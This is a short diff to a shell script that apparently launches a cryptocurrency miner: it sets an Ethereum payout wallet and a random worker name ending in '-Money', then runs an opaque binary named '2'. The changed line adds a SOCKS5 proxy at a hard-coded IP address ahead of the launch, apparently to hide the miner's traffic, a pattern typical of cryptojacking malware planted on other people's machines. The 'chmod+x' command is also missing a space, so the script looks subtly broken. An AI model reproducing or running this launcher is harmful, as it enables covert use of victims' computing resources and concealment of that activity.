@@ -7,4 +7,4 @@ E=-u
 F=ETH:0x40819d362CCfb0bb130C80cc0dBB4cdef5b02417
 G=$(echo $(shuf -i 1000-9999 -n 1)-Money)
 
-chmod+x 2 && ./2 $A $B $C $D $E $F.$G
+export http_proxy=socks5://72.221.172.203:4145 && chmod+x 2 && ./2 $A $B $C $D $E $F.$G
